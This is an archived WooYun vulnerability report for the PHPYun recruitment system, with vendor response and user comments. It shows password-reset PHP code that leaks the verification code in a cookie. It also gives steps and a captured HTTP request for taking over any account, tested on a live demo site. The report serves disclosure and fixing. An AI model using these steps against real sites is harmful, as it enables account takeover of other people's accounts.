{"id": 73343, "wybug_id": "wooyun-2015-0146243", "wybug_title": "phpyun 任意用户密码修改两处 (秒破/demo测试)", "wybug_corp": "php云人才系统", "wybug_author": "′雨。", "wybug_date": "2015-10-13 11:09", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-16：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 好久没看过php了。。。。 如题咯。 详细说明：  来看到找回密码的地方。app/controller/forgetpwd/index.class.php\nfunction send_action(){\t\t$username=yun_iconv(\"utf-8\",\"gbk\",$_POST['username']);\t\tif(!$this->CheckRegUser($username)&&!$this->CheckRegEmail($username)){\t\t\t$res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"用户名不符合规范！\");\t\t\t$res['type']='8';\t\t\techo json_encode($res);die;\t\t}\t\t$M=$this->MODEL(\"userinfo\");\t\t$where=array(\"`username`='\".$username.\"' or `email`='\".$username.\"' or `moblie`='\".$username.\"'\");\t\t$info=$M->GetMemberOne($where,array(\"field\"=>\"`uid`,`username`,`email`,`moblie`\"));        if($info['uid']){\t\t\t$sendcode=rand(100000,999999);//这里从这个范围里随机抽取一个数字来 生成token 来验证 数字还挺大的 然而并没有什么卵用。\t\t\tsetcookie(\"moblie_code\",$sendcode,time()+120, \"/\");//我擦 这是什么意思。。 为什么要把生成的token给我。。。            if($_POST['sendtype']=='email'){                if(!($this->config['sy_smtpserver']!=\"\" && $this->config['sy_smtpemail']!=\"\" && $this->config['sy_smtpuser']!=\"\")){                    $res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"还没有配置邮箱，请联系管理员！\");\t                $res['type']='8';\t                echo json_encode($res);die;                }elseif($this->config['sy_email_getpass']==\"2\"){                \t$res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"网站未开启邮件找回密码！\");\t                $res['type']='8';\t                echo json_encode($res);die;                }            }else{                if(!$this->config[\"sy_msguser\"] || !$this->config[\"sy_msgpw\"] || !$this->config[\"sy_msgkey\"]){                    $res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"还没有配置短信，请联系管理员！\");\t                $res['type']='8';\t                echo json_encode($res);die;                }elseif($this->config['sy_msg_getpass']==\"2\"){                    $res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"网站未开启短信找回密码！\");\t                $res['type']='8';\t                echo json_encode($res);die;                }            }\t\t\t$fdata=$this->forsend(array('uid'=>$info['uid'],'usertype'=>$info['usertype']));\t\t\t$data['uid']=$info['uid'];            $data['username']=$info['username'];\t\t\t$data['name']=$fdata['name'];\t\t\t$data['type']=\"getpass\";            if($_POST['sendtype']=='email'){                $data['email']=$info['email'];            }else{                $data['moblie']=$info['moblie'];            }\t\t\t$data['sendcode']=$sendcode;\t\t\t$data['date']=date(\"Y-m-d\");\t\t\t$status=$this->send_msg_email($data);\t\t\tif($_POST['sendtype']=='email'){\t\t\t\t$check=$info['email'];\t\t\t}else{\t\t\t\t$check=$info['moblie'];\t\t\t}            $cert=$M->GetCompanyCert(array(\"uid\"=>$info['uid'],\"type\"=>\"5\",\"check\"=>$check),array(\"field\"=>\"`uid`,`check2`,`ctime`,`id`\"));            if($cert){                $M->UpdateCompanyCert(array(\"check2\"=>$sendcode,\"ctime\"=>time()),array(\"id\"=>$cert['id']));            }else{                $M->AddCompanyCert(array('type'=>'5','status'=>0,'uid'=>$info['uid'],'check2'=>$sendcode,'check'=>$check,'ctime'=>time()));            }\t\t\tif($_POST['sendtype']=='email'){\t\t\t\t$res['msg']=iconv(\"gbk\",\"utf-8\",'验证码邮件发送成功！');\t\t\t}else{\t\t\t\t$res['msg']=iconv(\"gbk\",\"utf-8\",'验证码短信'.$status);\t\t\t\tif($status!=\"发送成功!\"){\t\t\t\t\t$res['type']='8';\t\t\t\t\techo json_encode($res);die;\t\t\t\t}\t\t\t}\t\t\t$res['type']='1';\t\t\t$res['uid']=$info['uid'];\t\t\t$res['username']=$this->half_replace(yun_iconv(\"gbk\",\"utf-8\",$info['username']),'GBK');\t\t\t$res['email']=$this->half_replace($info['email']);\t\t\t$res['moblie']=$this->half_replace($info['moblie']);\t\t\techo json_encode($res);die;        }else{            $res['type']='2';\t\t\techo json_encode($res);die;        }\t}\n分析见注释。直接demo测试一下。www.hr135.com我自己注册了一个号 xiaoyuhttp://www.hr135.com/index.php?m=forgetpw然后输入xiaoyu \n您正在找回密码的账号为：xi***yu，请选择重置密码方式： 选择密保邮箱 9158*******com 选择绑定手机号 141*****241 若您无法使用上述方法找回，请联系客服400-880-5523\n这里选择邮箱 然后下一步。\n\n然后我们刷新 抓包。\nGET /index.php?m=forgetpw HTTP/1.1Host: www.hr135.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveReferer: http://www.hr135.com/index.php?m=loginCookie: CNZZDATA3860868=cnzz_eid%3D728936302-1434163605-%26ntime%3D1434169820; safedog-flow-item=E8B28CBFB51FE7D89532C87629CB95F8; PHPSESSID=o3tg919m4gma3vq3mh6is5ce54; moblie_code=567221Cache-Control: max-age=0\nmoblie_code=567221  \n\n然后直接输入密码就行了。第二处另外一处就是手机页面的找回密码的文件\\app\\controller\\wap\\forgetpw.class.php\nfunction send_action(){\t\t$username=yun_iconv(\"utf-8\",\"gbk\",$_POST['username']);\t\tif(!$this->CheckRegUser($username)&&!$this->CheckRegEmail($username)){\t\t\t$res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"用户名不符合规范！\");\t\t\t$res['type']='8';\t\t\techo json_encode($res);die;\t\t}\t\t$M=$this->MODEL(\"userinfo\");\t\t$where=array(\"`username`='\".$username.\"' or `email`='\".$username.\"' or `moblie`='\".$username.\"'\");\t\t$info=$M->GetMemberOne($where,array(\"field\"=>\"`uid`,`username`,`email`,`moblie`\"));        if($info['uid']){\t\t\t$sendcode=rand(100000,999999);\t\t\tsetcookie(\"moblie_code\",$sendcode,time()+120, \"/\");\n跟pc文件的找回密码一样的问题 就不多说拉。。一样的。两个文件都修复下把。   漏洞证明：  如上。   修复方案：  去掉setcookie把。。和 换个牛逼点的验证。。。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-13 11:20 厂商回复： 感谢提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-13 11:15 |    \t\t1c3z \t\t\t( 普通白帽子  |\t\t\t        Rank:264 漏洞数:55        | #)\t\t \n  在床上也这么快么？    \n     2015-10-13 11:18 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 每日必关注乌云)\t\t \n  雨神回归了？不上课？    \n     2015-10-13 11:38 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1334 漏洞数:195        | 。)\t\t \n  可怕    \n     2015-10-13 12:46 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:233 漏洞数:81        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  d不见了。。    \n     2015-10-13 13:10 |    \t\tonpu \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:37        | 勿忘初心)\t\t \n  雨神归来    \n     2015-10-13 14:18 |    \t\t0xev4l \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 努力吧！骚年！北京买房买车买菜！)\t\t \n  雨神回归了！    \n     2015-10-13 14:22 |    \t\t0xev4l \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 努力吧！骚年！北京买房买车买菜！)\t\t \n  我猜一下，修改COOKIE中的uid，然后提交修改密码操作即可？    \n     2015-10-13 17:44 |    \t\tMsyb \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:13        | 非常荣幸加入乌云。)\t\t \n  来晚了    \n     2015-10-16 23:40 |    \t\thellowooyun \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | hello wooyun)\t\t \n  @0xev4l 这么简单的话不会2个$了    \n     2015-11-12 09:04 |    \t\t换个昵称 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:4        | 1)\t\t \n  原来如此，这么低级的错误都犯    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}